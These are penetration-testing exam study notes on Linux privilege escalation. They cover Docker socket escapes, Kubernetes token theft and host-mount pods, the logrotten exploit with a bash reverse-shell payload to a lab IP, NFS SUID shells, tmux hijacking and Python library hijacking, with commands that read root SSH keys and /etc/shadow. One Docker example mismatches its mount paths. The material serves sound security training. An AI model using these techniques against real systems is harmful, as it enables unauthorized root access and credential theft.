# CPTS Exam Prep Notes
## Sections XV – XXII: Docker, Kubernetes, Logrotate, Misc Techniques, Kernel Exploits & Python Hijacking

---

## Section XV: Docker

> Open source tool that provides a portable and consistent runtime environment. Uses containers as isolated environments in user space. Consumes fewer resources than a traditional server or virtual machine.

### Two Primary Components

| Component | Description |
|---|---|
| **Docker Client** | Interface for issuing commands and interacting with the Docker ecosystem |
| **Docker Daemon** | Responsible for executing commands and managing containers |

---

### I. Docker Daemon (Server)

Runs, interacts with, and manages Docker containers on the host system.

#### a) Managing Docker Containers
- Coordinates creation, execution and monitoring of containers
- Handles Docker image management
- Captures container logs
- Provides insight into container activities, errors, and debugging information

#### b) Network and Storage
- Facilitates container networking by creating virtual networks and managing NIFs
- Enables containers to communicate with each other and the outside world through ports, IP addresses and DNS resolution

---

### II. Docker Client

- Communicates with Docker Daemon through RESTful API or Unix socket
- Create, start, stop, manage, remove containers, search and download Docker images

> **Docker Compose** — Simplifies orchestration of multiple Docker containers as a single application. Allows defining multi-container architecture using a YAML file.

> **Docker Desktop** — Available for macOS, Linux and Windows. Provides a GUI that simplifies container management, monitoring status, inspecting logs and managing allocated resources.

---

### III. Docker Images and Containers

| Concept | Description |
|---|---|
| **Docker Image** | Blueprint/template for creating containers. Encapsulates everything needed to run an application: source code, dependencies, libraries and configuration |
| **Docker Container** | Instance of a Docker image. Lightweight, isolated and executable environment. Inherits all properties and configurations from its image |

> **Key distinction:** Images are **immutable (read-only)**. Containers are **mutable** and can be modified during runtime.

---

### IV. Docker Privilege Escalation

> **Condition:** You are in an environment where there are users who can manage Docker containers.

---

#### a) Docker Shared Directories

A shared directory is a **"live link"** between the host machine and a Docker container. Instead of the container being a sealed box, it can see and edit a specific folder on the host in real-time, allowing files to persist even if the container is deleted.

**Security implication:** If you compromise a container with a shared directory, it becomes your bridge to the host — write access to a shared directory can allow escape to the main server.

---

#### b) Docker Socket

The Docker socket (`/var/run/docker.sock`) is the primary API interface for the Docker daemon. Mounting this socket into a container introduces significant risks, including potential **root-level privilege escalation** on the host.

**Proof of Concept:**

**Step 1 — Connect to the socket:**
```bash
/tmp/docker -H unix:///app/docker.sock ps
# -H flag: "talk to this socket at /app/docker.sock"
# Lists all running containers -> confirms admin-level access
```

**Step 2 — The escape command:**
```bash
/tmp/docker -H unix:///app/docker.sock run --privileged -v /:/hostsystem main_app
# --privileged  -> full "god mode" permissions
# -v /:/hostsystem -> mounts host root (/) into /hostsystem inside the new container
# main_app -> uses an existing image on the server
```

**Step 3 — Enter the new container:**
```bash
/tmp/docker -H unix:///app/docker.sock exec -it <NEW_ID> /bin/bash
```

**Step 4 — Get the loot:**
```bash
cat /hostsystem/root/.ssh/id_rsa
# /hostsystem = real host filesystem -> grab root's SSH private key
```

---

#### c) Docker Group

A user must first have the required authorizations (membership in the `docker` group or sudo permissions for the Docker binary). Since many environments lack internet access, enumerate local images first:

```bash
docker image ls   # identify existing base images (ubuntu, alpine, etc.)
```

**Proof of Concept:**

```bash
# Run a privileged container mounting host root to /mnt
docker run --rm -it --privileged -v /:/mnt ubuntu /bin/bash

# Navigate to the mounted host filesystem
cd /hostsystem

# Access sensitive host files
cat /hostsystem/etc/shadow
cat /hostsystem/root/.ssh/id_rsa
```

---

## Section XVI: Kubernetes (k8s)

---

### I. K8s Concepts

- Revolves around **pods** — one pod can hold one or more closely connected containers
- One pod functions as a separate virtual machine on a **Node** (own IP, hostname, etc.)
- Kubernetes simplifies multi-container management: load balancing, service discovery, storage orchestration, self-healing
- Key features: **RBAC**, **Network Policies**, **Security Contexts**

#### Docker vs Kubernetes

| Function | Docker | Kubernetes |
|---|---|---|
| **Primary Role** | Platform for containerizing apps | Orchestration tool for managing containers |
| **Scaling** | Manual (Docker Swarm) | Automatic |
| **Networking** | Single network | Complex network with policies |
| **Storage** | Volumes | Wide range of storage options |

---

### A. Kubernetes Architecture

- **Control Plane (Master Node)** — Controls the Kubernetes cluster
- **Worker Nodes (Minions)** — Where containerized applications run

#### 1) Control Plane Ports

| Service | TCP Ports |
|---|---|
| etcd | 2379, 2380 |
| API Server | 6443 |
| Scheduler | 10251 |
| Controller Manager | 10252 |
| Kubelet API | 10250 |
| Read-Only Kubelet API | 10255 |

#### 2) Minions (Worker Nodes)

Nodes execute applications and receive instructions from the control plane. When a new pod is created, the **scheduler** selects the best node; the **API server** records this in **etcd**.

---

### B. K8s Security Measures

- Cluster infrastructure security
- Cluster configuration security
- Application security
- Data security

---

### II. Kubernetes API

The API is the single entry point to the cluster. All requests go to `kube-apiserver` → verifies permissions → validates request → stores desired state in `etcd`. Controllers continuously watch the API to reconcile actual state with desired state.

API resources (Pods, Services, Deployments) are managed via standard REST: `GET`, `POST`, `PUT/PATCH`, `DELETE`.

#### a) Authentication

Kubernetes security has two steps: **authentication** then **authorization**.

- **Authentication methods:** client certificates, bearer tokens, HTTP basic auth, authenticating proxy
- **Authorization:** Role-Based Access Control (RBAC) — assigns roles with specific permissions
- **Kubelet:** can be configured to allow anonymous requests by default (security risk if Kubelet API is reachable)

#### b) Server Interaction

```bash
# Anonymous access to root path (usually returns 403)
curl https://<IP>:6443 -k
```

#### c) Kubelet API — Extracting Pods

```bash
curl https://<IP>:10250/pods -k | jq
```

#### d) Kubeletctl — Extracting Pods

```bash
kubeletctl -i --server <IP> pods
```

#### e) Kubelet API — Available Commands

```bash
# Scan for RCE opportunities
kubeletctl -i --server 10.129.10.11 scan rce

# Execute command in a specific pod and container
# -p = pod, -c = container
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

---

### C. Privilege Escalation

Use [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account token and certificate (`ca.crt`).

#### a) Extract Token

```bash
kubeletctl -i --server 10.129.10.11 exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p nginx -c nginx | tee -a k8.token
```

#### b) Extract Certificate

```bash
kubeletctl --server 10.129.10.11 exec \
  "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
  -p nginx -c nginx | tee -a ca.crt
```

#### c) List Privileges

```bash
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://10.129.10.11:6443 auth can-i --list
```

> **Scenario:** If you have `get`, `create`, and `list` permissions on pods, create a YAML to mount the host's root filesystem.

#### d) Privilege Escalation YAML

```yaml
# privesc.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
# Apply the pod
kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://10.129.96.98:6443 apply -f privesc.yaml

# Verify pod is running
kubectl --token=$token --certificate-authority=ca.crt \
  --server=https://10.129.96.98:6443 get pod

# Grab the loot
kubeletctl --server 10.129.10.11 exec \
  "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

---

## Section XVII: Logrotate

CLI tool used to manage logs in a Linux environment.

```bash
logrotate --help
cat /etc/logrotate.conf
sudo cat /var/lib/logrotate.status
ls /etc/logrotate.d/
cat /etc/logrotate.d/dpkg
```

> Force a new rotation on the same day using the `-f`/`--force` option or by editing the date in `/var/lib/logrotate.status`.

### Privilege Escalation Conditions

| Requirement | Detail |
|---|---|
| Write permission | On the log file |
| Logrotate runs as root | Confirmed via process listing |
| Vulnerable version | 3.8.6, 3.11.0, 3.15.0, 3.18.0 |

### Exploit — logrotten

```bash
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

# Create the payload
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

# Determine logrotate options
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Execute
./logrotten -p ./payload /tmp/tmp.log
```

```bash
# Catch the reverse shell
nc -lvnp 9001
```

---

## Section XVIII: Miscellaneous Techniques

---

### I. Passive Traffic Capture

- If `tcpdump` is installed, unprivileged users may be able to capture traffic including credentials passed in cleartext
- Tools: [net-creds](https://github.com/DanMcInerney/net-creds) and **PCredz** to examine data on the wire

---

### II. Weak NFS Privileges

- Uses **TCP/UDP port 2049**

```bash
# List accessible NFS shares
showmount -e <IP>

# Check share permissions
cat /etc/exports
```

#### NFS Options

| Option | Description |
|---|---|
| `root_squash` | Root access is downgraded to `nfsnobody` — prevents SUID abuse |
| `no_root_squash` | Remote root = local root on server — **dangerous**, allows SUID creation |

**Example `/etc/exports`:**
```
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)    # root on your device = root on the server
```

#### Proof of Concept

**On the attack machine:**
```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```bash
gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

**On the victim machine:**
```bash
htb@NUX02:/tmp$ ./shell
root@NUX02# id
```

---

### III. Hijacking Tmux Sessions

Terminal multiplexers like `tmux` let you run multiple terminal sessions in one console. If a tmux session runs as root with weak socket permissions, it can be hijacked.

```bash
# Root creates a shared tmux session with a custom socket
tmux -S /shareds new -s debugsess
# -S /shareds      -> shared socket file
# new -s debugsess -> session named "debugsess"

# Root sets group ownership so "devs" can access
chown root:devs /shareds

# Verify the session is running as root
ps aux | grep tmux

# Check socket permissions
ls -la /shareds
# srw-rw---- 1 root devs ...

# Confirm you are in the "devs" group
id
# uid=1000(htb) gid=1000(htb) groups=...,devs

# Attach to the root-owned session
tmux -S /shareds

# Verify inside the session
id
# uid=0(root) gid=0(root)
```

---

## Section XIX: Kernel Exploits

```bash
# Check kernel version
uname -a

# Check OS version
cat /etc/lsb-release
```

> Look for outdated kernel versions with known CVEs.

---

## Section XXII: Python Library Hijacking

Common libraries: **NumPy** (numerical analysis), **Pandas** (data processing).

**Import methods:**
```python
import pandas            # method 1
from pandas import *     # method 2
from pandas import Series  # method 3
```

### Hijacking Vulnerabilities

1. Wrong write permissions
2. Library path abuse
3. PYTHONPATH environment variable

---

### A. Wrong Write Permissions

```bash
# Check script permissions
ls -l script.py

# Example script using psutil
#!/usr/bin/env python3
import psutil
available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
```

```bash
# Find the module's source file
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

# Check write permissions on the module
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

**Inject malicious code at the top of the target function:**

```python
# Inside __init__.py -> virtual_memory()
def virtual_memory():
    #### Hijacking
    import os
    os.system('id')
    # ... rest of original function
```

```bash
# Run the script as sudo to trigger the payload
sudo /usr/bin/python3 ./script.py
```

> **Important:** Always inject at the **beginning** of the function.

---

### B. Library Path

Each Python version searches for modules in a specific order defined by `PYTHONPATH`.

```bash
# List Python module search paths (in priority order)
python3 -c 'import sys; print("\n".join(sys.path))'
```

**Prerequisites:**
1. The imported module is located in a **lower priority** path
2. You have **write permission** to a **higher priority** path

```bash
# Find where the module is installed
pip3 show <python_module>

# Verify write permissions on that directory
ls -la <module_location>
```

**Create a malicious replacement module in the higher-priority path:**

```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
```

Then run the script (as root if possible) to trigger execution.

---

### C. PYTHONPATH Environment Variable

An environment variable that tells Python which directories to search for modules.

**Proof of Concept:**

```bash
# Step 1 — Check sudo permissions
sudo -l
# Look for: (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

```python
# Step 2 — Create malicious module in /tmp
# /tmp/psutil.py
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
```

```bash
# Step 3 — Privilege escalation
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

---

*End of Notes — Sections XV through XXII*
